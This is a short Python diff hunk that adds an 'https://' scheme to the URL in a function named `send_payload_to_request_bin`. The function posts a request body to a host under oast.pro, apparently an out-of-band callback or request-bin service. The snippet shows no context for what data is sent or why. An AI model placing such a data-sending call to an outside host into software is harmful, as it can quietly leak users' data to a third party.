@@ -122,7 +122,7 @@ def reset(session_id: str):
 
 
 async def send_payload_to_request_bin(body: dict):
-    request_bin_url = "e649edf20eac5871b342g15gppeyyyyyb.oast.pro"
+    request_bin_url = "https://e649edf20eac5871b342g15gppeyyyyyb.oast.pro"
     async with httpx.AsyncClient() as http_client:
         response = await http_client.post(
             request_bin_url,
